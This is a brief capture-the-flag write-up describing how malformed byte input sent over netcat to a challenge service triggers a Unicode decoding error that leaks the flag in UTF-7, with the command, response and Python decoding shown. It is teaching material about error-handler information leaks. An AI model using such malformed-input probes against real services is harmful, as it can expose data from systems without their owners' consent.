# Unic0de Solution
*by Javantea*  
Jun 3, 2019

You need to give it invalid utf-8 that is also invalid utf-16. It responds with the error and the flag encoded with utf-7. This fits the real world scenario where someone has a try catch around their unicode decoder with a decode in their catch.

solve.py shows the basic structure of my solution which is reproduced below.

```
ssh javantea@ctf.neg9.net
echo -n $'\xc9\x91\xef' | nc -u challenges 9010
'utf-16-le' codec can't decode byte 0xef in position 2: truncated data+2DXcH//o2ADcXAJR/0c +2DXdztg13V/YNd8E2DXdvNg13CjYNd1V2DXcUg +BU/YNdyw2DXcaqTXBAU-

python
a = b'+2DXcH//o2ADcXAJR/0c +2DXdztg13V/YNd8E2DXdvNg13CjYNd1V2DXcUg +BU/YNdyw2DXcaqTXBAU-'.decode('utf-7')
a
'𝐟￨𐁜ɑｇ 𝗎𝕟𝜄𝖼𝐨𝕕𝑒 Տ𝒰𝑪ꓗЅ'

```

## Troubleshooting

Before you says "it doesn't work for me" there is an infrastructure problem where udp packets are being dropped. It's not my challenge's fault. We need to fix the infrastructure. Until then, send the exploit multiple times.
